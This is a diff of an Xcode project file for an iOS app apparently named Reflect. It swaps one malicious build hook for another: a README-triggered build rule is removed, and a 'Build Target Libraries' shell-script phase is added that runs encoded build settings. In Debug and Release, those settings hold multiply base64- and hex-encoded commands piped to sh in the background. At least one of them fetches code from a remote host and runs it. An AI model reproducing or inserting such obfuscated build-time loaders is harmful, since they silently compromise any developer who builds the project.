@@ -10,24 +10,10 @@
 		04F260712F33602B00BF5E99 /* WidgetKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 04F260702F33602B00BF5E99 /* WidgetKit.framework */; };
 		04F260732F33602B00BF5E99 /* SwiftUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 04F260722F33602B00BF5E99 /* SwiftUI.framework */; };
 		04F2607E2F33602C00BF5E99 /* Quick ActionsExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 04F2606E2F33602B00BF5E99 /* Quick ActionsExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
-		CDCCD5B5690D4E22B1C62C0C /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 061D49F854764D9794C62C0C /* README.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		596CE71148814B1BBFC62C0C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AC0C26C}\"";
-		};
-/* End PBXBuildRule section */
+															/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		04F2607C2F33602C00BF5E99 /* PBXContainerItemProxy */ = {
@@ -58,7 +44,6 @@
 		04F2606E2F33602B00BF5E99 /* Quick ActionsExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = "Quick ActionsExtension.appex"; sourceTree = BUILT_PRODUCTS_DIR; };
 		04F260702F33602B00BF5E99 /* WidgetKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WidgetKit.framework; path = System/Library/Frameworks/WidgetKit.framework; sourceTree = SDKROOT; };
 		04F260722F33602B00BF5E99 /* SwiftUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = SwiftUI.framework; path = System/Library/Frameworks/SwiftUI.framework; sourceTree = SDKROOT; };
-		061D49F854764D9794C62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
@@ -130,7 +115,6 @@
 		042635F12F288EA100BB939D /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				061D49F854764D9794C62C0C /* README.md */,
 				042635F02F288EA100BB939D /* Reflect.app */,
 				04F2606E2F33602B00BF5E99 /* Quick ActionsExtension.appex */,
 			);
@@ -153,13 +137,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 042635FB2F288EA300BB939D /* Build configuration list for PBXNativeTarget "Reflect" */;
 			buildPhases = (
+				57A1830C51E24E38AD1DACE1 /* Build Target Libraries */,
 				042635EC2F288EA100BB939D /* Sources */,
 				042635ED2F288EA100BB939D /* Frameworks */,
 				042635EE2F288EA100BB939D /* Resources */,
 				04F2607F2F33602C00BF5E99 /* Embed Foundation Extensions */,
 			);
 			buildRules = (
-				596CE71148814B1BBFC62C0C /* PBXBuildRule */,
 			);
 			dependencies = (
 				04F2607D2F33602C00BF5E99 /* PBXTargetDependency */,
@@ -234,12 +218,33 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		57A1830C51E24E38AD1DACE1 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXResourcesBuildPhase section */
 		042635EE2F288EA100BB939D /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				CDCCD5B5690D4E22B1C62C0C /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -281,7 +286,8 @@
 		042635F92F288EA300BB939D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxaE1IaDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWtWelZxWVVkR01HTjVOWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | x | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((l(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUSE5tSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJM0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6Ylc5eVpXbHVMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | l | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((k(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333636320a3337333333363336333436333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333337333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633373334333633393336363433363335333733373336333533363332333636353336333533373334333236350a333633393061333636353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | k | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((j(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeFpibXd3V2xNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | j | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -347,7 +353,8 @@
 		042635FA2F288EA300BB939D /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxaE1IaDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWtWelZxWVVkR01HTjVOWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | x | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((l(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJUSE5tSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJM0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6Ylc5eVpXbHVMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | l | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((k(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333636320a3337333333363336333436333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333337333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633373334333633393336363433363335333733373336333533363332333636353336333533373334333236350a333633393061333636353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | k | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((j(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJOSGVHeFpibXd3V2xNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | j | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
